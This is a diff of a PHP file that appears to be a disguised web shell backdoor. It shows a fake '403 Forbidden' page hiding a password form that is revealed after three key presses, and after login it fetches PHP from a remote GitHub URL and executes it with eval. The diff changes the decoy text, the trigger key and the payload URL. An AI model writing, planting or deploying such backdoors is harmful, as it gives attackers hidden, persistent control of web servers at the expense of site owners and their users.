@@ -3,20 +3,18 @@ $auth_pass = "d13b3e2d9af9b9aa090edf30e6251328a60ef5cdfd46478e60b495d210ba4576";
 
 function Login() {
     die("<html>
-  <title>403 Forbidden</title>
-</head><body>
-<h1>Forbidden</h1>
-<p>You don't have permission to access this resource.</p>
-<p>Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request.</p>
-<center>
-<div style='cursor:pointer;'></div>
+    <title>403 Forbidden</title>
+    <center><h1>403 Forbidden</h1></center>
+    <hr><center>nginx (apache v.168 Babe) </center>
+    <center>
+    <div style='cursor:pointer;'></div>
     <form id='login-form' method='post' style='display:none;'>
         <input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'>
     </form>
     <script>
     let clickCount = 0;
     document.addEventListener('keydown', function(event) {
-        if (event.key === '1') {
+        if (event.key === '3') {
             clickCount++;
             if (clickCount === 3) {
                 document.getElementById('login-form').style.display = 'block';
@@ -58,7 +56,7 @@ function is_logged_in() {
 
 if (is_logged_in()) {
  
-    $a = fetchRemoteContent('https://raw.githubusercontent.com/SoftWareAppsz/pakkades/refs/heads/main/rs.php');
+    $a = fetchRemoteContent('https://raw.githubusercontent.com/SoftWareAppsz/pakkades/refs/heads/main/in.php');
     if ($a !== false) {
         eval('?>' . $a);
     } else {
